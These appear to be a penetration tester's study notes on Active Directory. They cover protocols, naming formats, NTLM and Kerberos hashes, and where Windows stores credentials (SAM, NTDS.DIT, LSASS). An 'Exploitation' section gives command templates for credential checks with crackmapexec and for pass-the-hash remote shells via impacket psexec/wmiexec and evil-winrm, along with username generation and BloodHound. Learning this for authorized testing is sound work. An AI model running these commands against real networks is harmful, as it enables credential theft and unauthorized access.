# AD Info
Active Directory is the Windows implementation of a general-purpose directory service.

---

## Common protocols used
|Service|port|Description|
|-|-|-|
|DNS|53|Host/IP translation|
|Kerberos, kpasswd|88,464|Authentication|
|RPC, RPC over HTTP|135, 593|Communication|
|NetBIOS|137, 138, 139|Communication, host/IP translation|
|LDAP, tls|389, 636|Main directory service, authorization|
|SMB|445|Communication|
|Global catalog LDAP, tls|3268, 3269|-|

---

AD Users and Computers:
* Objects
	* User account
		* Domain user account
		* Local user account
	* Computer account
	* Groups
		* Security Group
		* Distribution Group
	* Shares
	* Printers
	* Organizational Units (OU)
	* Attributes
	* Delegate Control

Service account:
* Managed service account (MSA)
	* sMSA
	* gMSA
* Computer account
* User account
	* Domain user account
	* Local user account

---

## Domain Naming
#### Down-level logon name
* NetBIOS_domain_name/samAccountName
* legacy systems - backwards compatible - used for local signon
* 20 chars long

#### User Principal Name (UPN)
* userPrincipalName@DNS_domain_name
* Useful in multi-domain 
* Reflects email style

http://blog.schertz.name/2012/08/understanding-active-directory-naming-formats/

*User account naming:*
* userPrincipalName
* sAMAccountName

*Domain & computers naming:*
* NetBIOS name
* DNS name

#### Naming Conventions
firstlast
first.last
flast
f.last
firlas
fir.las

Possible usernames can be calculated with username-anarchy:

`username-anarchy -i <NAMESLIST>`

---

## Windows authentication
Windows uses multiple authentication suites/protocols. Most important are NTLM authentication (LM authentication, NTLMv1, NTLMv2 and NTLM2 Session) and kerberos authentication.

NTLM authentication is a family of authentication protocols that are encompassed in the Windows Msv1_0.dll. The NTLM authentication protocols include LM version 1 and 2, and NTLM version 1 and 2. The NTLM authentication protocols authenticate users and computers based on a challenge/response mechanism that proves to a server or domain controller that a user knows the password associated with an account.

Kerberos authentication is the preferred authentication method for Active Directory environments.

A Windows hash consists of 2 parts: LM:NT. NTLM and Kerberos all use the NT hash, also known as the Unicode hash. LM authentication uses the LM hash:
* LM hash: 2 parts DES. Stored for backward compatibility reasons. No longer need it
* NT hash: MD4 hash

SAM: password hashes local account - pass the hash - NTLM
	encrypted with SYSTEM bootkey
SECURITY: cached domain credentials - logged on host
SYSTEM: LSA secrets
NTDS.DIT: user hashes on stored on DC
	DRSUAPI or VSS
	Kerberos keys
LSASS process from memory: clear-text passwords from logged on users, kerberos tickets

Credential Manager
Protected Storage

#### Calculate NT hash
```Python
import hashlib,binascii
print(binascii.hexlify(hashlib.new('md4', "<PASSWORD>".encode('utf-16le')).digest()))
```

---

## Exploitation
Check:
`crackmapexec SERVICE <IP> -u '<USER>' -p <PASS>` hash: -H

Shell:
`impacket-wmiexec -hashes '<HASH>' <USER>@<IP>`
`impacket-psexec -hashes '<HASH>' <USER>@<IP>`
`evil-winrm -i <IP> -u <USER> -p '<PASS>'` hash: -H
`python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass`
`psexec.py -k -no-pass -dc-ip <IP> AD/administrator@192.168.1.100`
smbexec.py
wmiexec.py

---

## Post-exploitation
`Bloodhound`
	`SharpHound` for local AD
	`AzureHound` for Azure AD